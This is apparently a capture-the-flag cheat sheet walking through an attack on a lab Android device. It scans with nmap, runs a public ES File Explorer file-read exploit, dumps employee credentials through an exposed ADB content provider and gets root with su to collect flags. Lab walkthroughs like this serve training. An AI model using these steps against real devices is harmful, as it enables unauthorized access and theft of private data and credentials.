# Cheat Sheet of Android Attack Path
1. Run an nmap scan on 10.11.12.39 (Android IP). 
    - `nmap -p -sC -sV 10.11.12.39 -Pn`
    - A user will notice: ES File Explorer (59777), ADB(5555), SSH (22)
    - ES File Explorer has an active exploit 
2. To get the active exploit can use the `searchsploit` command:
    - `searchsploit ES File Explorer`
    - You will find the exploit: ES File Explorer 4.1.9.7.4 Arbitrary File Read with the path android/remote/50070.py
3. To download the exploit run the following command:
    - `searchsploit -m android/remote/50070.py`
    - The exploit will be in the Kali Downloads Folder
4. To run the exploit you must use the following command: `python3 50070.py [OPTION] [Device IP]`
    - Options include : `listFiles`, `listPics`, `listVideos`, `listAudios`, `listApps`,   `listAppsSystem`, `listAppsPhone`, `listAppsSdcard`, `listAppsAll`, `getFile`, `getDeviceInfo`
    - Upon going through the options of the exploit `listApps` and `listPics` will give the user most insight into the Android device to retrieve flags.
5. Executing the exploit with the `listPic` option will reveal that there are images stored in /storage/emulated/0/DCIM
    - A user can reveal the contents of the images using the command: `python3 50070.py getFile [Device IP] '/path..to..the..image'`
    - This generates an out.dat file
6. The user must then convert the contents of the out.dat files to a .jpg extension using the command:
    - `mv out.dat [name].jpg`
    - Navigate to the Downloads folder and open the images to see if you can find the user.txt flag.
7. Executing the exploit with the `listApps` option will reveal that there is a Carefree Enterprise application installed on the Android device
    - The application package name is com.example.carefreeenterprise
8. Once the packagename is retrieved, the user can connect to the device via ADB to find information about the package using the command: 
    - `adb connect [Device IP]:5555`
9. Once connected, the user can check for any databases that have sensitive information using the command: 
    - `adb shell dumpsys package provider | grep carefree`
    - The applications content provider URI is shown with its full path
10. Now that the user has the full path to the database of CarefreeEnterprises application, they can query the database to see all content
    - `adb shell content query --uri content://com.example.carefreeenterprise/.employeeProvider`
11. User has now obtained all login information for Ubuntu (Arnold's Work Machine)
12. Now that user has access to all employee credentials and a `user.txt` flag, you need to obtain root privilages to obtain the `root.txt` flag.
13. To obtain shell on an android device, a user simply has to type command: 
    - `adb shell`
14. User can obtain root privileges without a password using command: 
    - `su`
    - A user can now find `root.txt` flag within data/root.txt.
